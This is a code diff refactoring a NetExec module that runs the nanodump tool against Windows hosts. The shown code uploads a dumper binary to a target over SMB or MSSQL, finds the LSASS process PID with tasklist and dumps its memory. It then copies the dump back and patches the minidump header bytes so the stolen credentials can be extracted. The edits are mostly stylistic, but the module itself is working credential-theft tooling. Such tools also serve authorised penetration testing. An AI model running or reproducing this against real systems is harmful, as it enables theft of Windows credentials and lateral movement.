@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # nanodump module for nxc python3
 # author of the module : github.com/mpgn
 # nanodump: https://github.com/helpsystems/nanodump
@@ -35,7 +33,7 @@ class NXCModule:
         self.module_options = module_options
 
     def options(self, context, module_options):
-        """
+        r"""
         TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
         NANO_PATH           Path where nano.exe is on your system (default: OS temp directory)
         NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
@@ -100,7 +98,7 @@ class NXCModule:
             with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                 try:
                     self.context.log.display(f"Copy {self.nano} to {self.remote_tmp_dir}")
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.put_file(nano.read(), self.remote_tmp_dir + self.nano)
                     if exec_method.file_exists(self.remote_tmp_dir + self.nano):
                         self.context.log.success(f"Created file {self.nano} on the remote machine {self.remote_tmp_dir}")
@@ -113,19 +111,19 @@ class NXCModule:
         # apparently SMB exec methods treat the output parameter differently than MSSQL (we use it to display())
         # if we don't do this, then SMB doesn't actually return the results of commands, so it appears that the
         # execution fails, which it doesn't
-        display_output = True if self.context.protocol == "smb" else False
+        display_output = self.context.protocol == "smb"
         self.context.log.debug(f"Display Output: {display_output}")
         # get LSASS PID via `tasklist`
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
         self.context.log.display(f"Getting LSASS PID via command {command}")
         p = self.connection.execute(command, display_output)
         self.context.log.debug(f"tasklist Command Result: {p}")
+        if not p or p == "None":
+            self.context.log.fail("Failed to execute command to get LSASS PID")
+            return
+
         if len(p) == 1:
             p = p[0]
-
-        if not p or p == "None":
-            self.context.log.fail(f"Failed to execute command to get LSASS PID")
-            return
 
         pid = p.split(",")[1][1:-1]
         self.context.log.debug(f"pid: {pid}")
@@ -138,7 +136,7 @@ class NXCModule:
         self.context.log.debug(f"NanoDump Command Result: {p}")
 
         if not p or p == "None":
-            self.context.log.fail(f"Failed to execute command to execute NanoDump")
+            self.context.log.fail("Failed to execute command to execute NanoDump")
             self.delete_nanodump_binary()
             return
 
@@ -154,7 +152,7 @@ class NXCModule:
 
         if dump:
             self.context.log.display(f"Copying {nano_log_name} to host")
-            filename = os.path.join(self.dir_result,f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
+            filename = os.path.join(self.dir_result, f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
             if self.context.protocol == "smb":
                 with open(filename, "wb+") as dump_file:
                     try:
@@ -190,14 +188,13 @@ class NXCModule:
                 except Exception as e:
                     self.context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on dir {self.remote_tmp_dir}: {e}")
 
-            fh = open(filename, "r+b")
-            fh.seek(0)
-            fh.write(b"\x4d\x44\x4d\x50")
-            fh.seek(4)
-            fh.write(b"\xa7\x93")
-            fh.seek(6)
-            fh.write(b"\x00\x00")
-            fh.close()
+            with open(filename, "r+b") as fh:  # needs the "r+b", not "rb" like below
+                fh.seek(0)
+                fh.write(b"\x4d\x44\x4d\x50")
+                fh.seek(4)
+                fh.write(b"\xa7\x93")
+                fh.seek(6)
+                fh.write(b"\x00\x00")
 
             with open(filename, "rb") as dump:
                 try:
